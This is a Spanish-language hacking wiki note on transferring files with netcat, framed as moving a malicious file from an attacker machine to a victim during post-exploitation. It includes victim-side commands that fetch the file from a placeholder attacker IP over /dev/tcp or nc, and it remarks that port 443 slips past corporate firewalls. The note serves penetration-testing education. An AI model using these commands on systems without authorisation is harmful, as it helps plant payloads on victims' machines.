# 📂 Transferencia de Archivos con Netcat

## 🔄 Transferencia de Archivos entre Máquinas

> [!tip] Escenario
> Esta técnica es especialmente útil en pruebas de penetración o situaciones donde se necesita transferir archivos entre sistemas cuando otras herramientas como SCP, FTP o HTTP no están disponibles.

Netcat (nc) proporciona un método rápido y versátil para transferir archivos a través de conexiones TCP, funcionando en prácticamente cualquier sistema operativo con una implementación de netcat.

## 🚀 Proceso de Transferencia

### En la máquina atacante (remitente)

```bash
# Escuchar en el puerto 443 y enviar el contenido del archivo
nc -nlvp 443 < archivo_malicioso
```

> [!info] Parámetros explicados
> - `-n`: No realizar resolución DNS
> - `-l`: Modo de escucha
> - `-v`: Modo verboso (muestra detalles de la conexión)
> - `-p 443`: Especifica el puerto de escucha (443)

### En la máquina víctima (receptora)

```bash
cat < /dev/tcp/ip_atacante/443 > archivo_malicioso
```

> [!note] Alternativa
> También se puede usar netcat en la máquina receptora:
> ```bash
> nc ip_atacante 443 > archivo_malicioso
> ```

## ✅ Verificación de Integridad

Para garantizar que el archivo se transfirió correctamente sin corrupción, podemos utilizar [[md5sum]] para verificar la integridad:

### En ambas máquinas (atacante y víctima)

```bash
md5sum archivo_malicioso
```

> [!success] Transferencia exitosa
> Si los hashes MD5 coinciden en ambos extremos, la transferencia se completó sin errores.

## 🛡️ Consideraciones de Seguridad

> [!warning] Advertencia
> - Esta transferencia **no está cifrada** - cualquiera que monitoree la red puede interceptar el archivo
> - Para transferencias seguras, considere tunelizar a través de SSH o usar herramientas como `scp`
> - Los puertos comunes como 443 suelen tener menos restricciones en firewalls corporativos

## 🔍 Casos de Uso Adicionales

### Transferencia de directorios completos

```bash
# En la máquina atacante
tar -czf - /ruta/directorio | nc -nlvp 443

# En la máquina víctima
nc ip_atacante 443 | tar -xzf -
```

### Transferencia bidireccional (chat simple)

```bash
# En la máquina A
nc -nlvp 443

# En la máquina B
nc ip_maquina_a 443
```

---

## 🔗 Recursos Relacionados

- [[md5sum]]

#hacking #transferencia_archivos #netcat #post_explotacion #redes

---

[[wiki]]